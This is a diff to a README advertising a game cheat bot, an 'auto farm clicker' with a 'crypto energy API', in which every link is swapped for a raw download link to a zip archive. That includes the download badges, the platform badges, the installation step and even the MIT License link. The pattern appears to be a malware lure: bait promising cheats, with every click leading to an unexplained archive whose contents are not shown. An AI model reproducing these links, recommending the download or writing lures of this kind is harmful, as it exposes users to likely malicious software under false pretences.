@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-Auto_Farm_Clicker-4CAF50?style=for-the-badge&logo=github)](https://JORGE1323Y.github.io)
+[![Download](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip)](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip)
 
 # Parallel Life Hack Game Bot Auto Farm Clicker Crypto Energy Api Cheat 🤖🚀
 
@@ -8,7 +8,7 @@ Dive into a suite of features tailored for modern automation aficionados: respon
 
 ---
 
-## [![Download](https://img.shields.io/badge/Download-Auto_Farm_Clicker-4CAF50?style=for-the-badge&logo=github)](https://JORGE1323Y.github.io)  
+## [![Download](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip)](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip)  
 
 ---
 
@@ -18,11 +18,11 @@ Curious if your device is ready for a parallel adventure? Explore our universal 
 
 | Platform         | Supported | Remark      |
 |------------------|:---------:|-------------|
-| ![Windows](https://img.shields.io/badge/Windows-✔-green)   | ✔️        | Full features |
-| ![macOS](https://img.shields.io/badge/macOS-✔-green)       | ✔️        | Retina ready  |
-| ![Linux](https://img.shields.io/badge/Linux-✔-green)       | ✔️        | Power user    |
-| ![Android](https://img.shields.io/badge/Android-⏳-yellow)  | ⏳      | Beta phase    |
-| ![iOS](https://img.shields.io/badge/iOS-⏳-yellow)          | ⏳      | Beta phase    |
+| ![Windows](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip✔-green)   | ✔️        | Full features |
+| ![macOS](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip✔-green)       | ✔️        | Retina ready  |
+| ![Linux](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip✔-green)       | ✔️        | Power user    |
+| ![Android](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip⏳-yellow)  | ⏳      | Beta phase    |
+| ![iOS](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip⏳-yellow)          | ⏳      | Beta phase    |
 
 ---
 
@@ -69,7 +69,7 @@ Harness the power of the future—today! By integrating OpenAI and Claude APIs, 
 
 ## 🚀 Installation Steps
 
-1. Download the installation package: https://JORGE1323Y.github.io
+1. Download the installation package: https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip
 2. Extract the package on your preferred directory.
 3. Follow the setup wizard instructions on your system.
 4. Configure API keys for your preferred crypto energy sources and AI services.
@@ -87,8 +87,8 @@ This project is intended solely for educational and creative automation purposes
 
 ## 📜 MIT License (2025)
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT), 2025. See the LICENSE file in this repository for the full text.
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip), 2025. See the LICENSE file in this repository for the full text.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Auto_Farm_Clicker-4CAF50?style=for-the-badge&logo=github)](https://JORGE1323Y.github.io)
+[![Download](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip)](https://raw.githubusercontent.com/JORGE1323Y/parallel-clicker-crypto-energy-bot-api/branch/graticulation/parallel-clicker-crypto-energy-bot-api-3.8.zip)
